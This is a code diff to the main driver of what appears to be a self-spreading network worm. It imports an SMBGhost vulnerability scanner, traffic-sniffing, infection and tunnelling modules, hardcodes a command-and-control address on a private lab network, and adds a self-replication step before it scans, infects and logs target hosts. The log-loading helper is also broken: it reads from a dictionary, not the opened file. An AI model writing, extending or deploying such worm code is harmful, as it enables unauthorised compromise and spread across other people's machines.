@@ -1,12 +1,13 @@
-import pickle
+import pickle, os, platform
 import armory.SMBGhost.cve20220796scanner as cve20220796scanner
 from sniff import sniff
 from infect import infect
 import tunnel as comm
+from replicate import replicate
 
 
-def main(ip_range):
-    targets = ip_range
+def main():
+    replicate().self_replicate(platform.system())
     c2_server = "192.168.56.108"
     not_testing_targets = ["192.168.56.1", "192.168.56.100", "192.168.56.108"]
     network = sniff()
@@ -29,27 +30,28 @@ def main(ip_range):
                             tunnel.start()
                             infection = infect(target_ip.address,running_port, local_ip, listening_port)
                             infection.start()
+                            
+                            infection.join()
                             tunnel.close_client_connection(target_ip.address)
+                            
                             if local_ip in log:
                                 log[local_ip]["infects"].update({target_ip.addres:True})
                             else:
                                 log[local_ip] = {"status":True,"infects":{}}
 
-    def load_log():
-        log = {}
-        with open("container/infect.log",'rb') as data:
-            log = pickle.loads(log.read())
-        return log
-            
-            
-    def unload_log(log:dict):
-        with open("container/infect.log", 'wb') as log_file:
-            data = pickle.dumps(log)
-            log_file.write(data)
+def load_log():
+    log = {}
+    with open("container/infect.log",'rb') as data:
+        log = pickle.loads(log.read())
+    return log
         
-
+        
+def unload_log(log:dict):
+    with open("container/infect.log", 'wb') as log_file:
+        data = pickle.dumps(log)
+        log_file.write(data)
+        
 
 if __name__=='__main__':
     #ip_range = sys.argv[1]
-    ip_range=2
-    main(ip_range)
+    main()
